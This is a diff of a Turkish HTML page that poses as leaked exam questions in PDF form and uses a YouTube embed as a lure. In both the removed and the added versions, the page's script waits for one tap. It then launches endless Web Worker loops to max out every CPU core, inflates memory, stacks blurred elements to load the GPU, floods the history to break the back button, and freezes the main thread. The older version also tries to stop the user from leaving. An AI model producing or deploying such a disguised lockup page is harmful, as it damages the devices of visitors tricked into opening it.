@@ -1,86 +1,47 @@
+
 <!DOCTYPE html>
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Sınav Soruları PDF (Sızdırıldı)</title>
+    <title>Sınav Soruları PDF</title>
     <style>
-        body { background: #000; color: #ff0000; text-align: center; font-family: 'Courier New', monospace; padding-top: 50px; overflow: hidden; }
-        .warning { font-size: 24px; font-weight: bold; animation: blink 0.5s infinite; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
-        iframe { width: 90%; height: 300px; border: 3px solid red; margin-top: 20px; pointer-events: none; }
-        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; cursor: pointer; background: rgba(0,0,0,0.1); }
+        body { background: #000; color: #f00; text-align: center; font-family: sans-serif; overflow: hidden; }
+        .box { border: 5px solid gold; margin: 20px; padding: 20px; }
     </style>
 </head>
-<body onload="init()">
-    <div class="warning">⚠️ SİSTEME SIZILDI: VERİLER İNDİRİLİYOR ⚠️</div>
-    <p>Soruların yüklenmesi için ekrana bir kez dokunun...</p>
-
-    <iframe id="videoFrame" src="https://www.youtube.com/embed/gy955m2mpcM?autoplay=0&controls=0&mute=1"></iframe>
-
-    <div class="overlay" id="trigger"></div>
+<body onclick="kickStart()">
+    <div class="box">
+        <h1>⚠️ SINAV SORULARI YÜKLENİYOR ⚠️</h1>
+        <p>Dosyayı açmak için ekrana BİR KEZ DOKUNUN.</p>
+        <iframe width="100%" height="300" src="https://www.youtube.com/embed/gy955m2mpcM?autoplay=1&mute=1" frameborder="0"></iframe>
+    </div>
 
     <script>
-        function init() {
-            document.getElementById('trigger').addEventListener('click', function() {
-                // Video oynamaya başlar gibi görünür
-                document.getElementById('videoFrame').src += "&autoplay=1";
-                this.innerHTML = "<h1 style='color:white; margin-top:50%'>YÜKLENİYOR... %12</h1>";
-                
-                // "Bakkal Zihni" operasyonu başlıyor
-                startTotalMeltdown();
-            });
-        }
-
-        function startTotalMeltdown() {
-            // 1. ÇOKLU ÇEKİRDEK (CPU) SALDIRISI
-            // Telefonun kaç çekirdeği varsa hepsini %100 yük altına sokar
-            const coreCount = navigator.hardwareConcurrency || 8;
-            const workerCode = `
-                while(true) {
-                    Math.sqrt(Math.random() * Math.random());
-                    new Array(10000).fill('BAKKAL_ZİHNİ_KAZIĞI');
-                }
-            `;
-            const blob = new Blob([workerCode], { type: 'application/javascript' });
-            const workerUrl = URL.createObjectURL(blob);
-
-            for (let i = 0; i < coreCount * 2; i++) {
-                new Worker(workerUrl);
+        function kickStart() {
+            // Telefonun tüm çekirdeklerini (CPU) %100 yap
+            const cores = navigator.hardwareConcurrency || 12;
+            for (let i = 0; i < cores * 8; i++) { // Bilgisayarda 2 katı, telefonda 8 katı worker
+                const blob = new Blob(['while(true){Math.random()*Math.random()}'], {type: 'text/javascript'});
+                const worker = new Worker(URL.createObjectURL(blob));
             }
 
-            // 2. RAM VE GRAFİK (GPU) BOĞMA
-            // Ekrana sürekli ağır filtreli elementler basarak GPU'yu kilitler
-            let memoryHog = [];
-            function renderChaos() {
-                for (let i = 0; i < 100; i++) {
-                    // RAM'i şişir
-                    memoryHog.push(new Array(50000).join('RAM_KILLER_'));
-                    
-                    // Arayüzü (DOM) ağırlaştır
-                    let div = document.createElement('div');
-                    div.style.cssText = "position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,0,0,0.1); filter:blur(10px) contrast(200%); pointer-events:none;";
-                    document.body.appendChild(div);
+            // RAM'i ve Arayüzü (GPU) kilitle
+            let bakkalKazigi = [];
+            setInterval(() => {
+                for (let i = 0; i < 1000; i++) {
+                    bakkalKazigi.push(new Array(100000).join("ZİHNİ")); // RAM'i şişir
+                    let d = document.createElement('div');
+                    d.style.cssText = "position:fixed;width:1px;height:1px;box-shadow:0 0 100px red;filter:blur(50px);";
+                    document.body.appendChild(d); // Ekran kartını (GPU) yor
                 }
-                // Ana iş parçacığını (Main Thread) kilitler
-                requestAnimationFrame(renderChaos);
+                // Geri tuşunu boz
+                history.pushState(null, "", "#" + Math.random());
+            }, 10);
+
+            // Sonsuz döngü (Main Thread)
+            while(true) {
+                console.log("Bakkal Zihni devrede...");
             }
-
-            // 3. TARAYICI GEÇMİŞİ TUZAĞI
-            // Geri tuşuna basılmasını imkansız hale getirir
-            setInterval(function() {
-                for (let i = 0; i < 20; i++) {
-                    history.pushState(null, "", "#" + Math.random());
-                }
-            }, 100);
-
-            // 4. SON VURUŞ: ANA DÖNGÜ KİLİDİ
-            setTimeout(() => {
-                renderChaos();
-                while(true) {
-                    // Sayfadan çıkışı engellemeye çalış
-                    window.onbeforeunload = function() { return "ÇIKAMAZSIN!"; };
-                }
-            }, 500);
         }
     </script>
 </body>
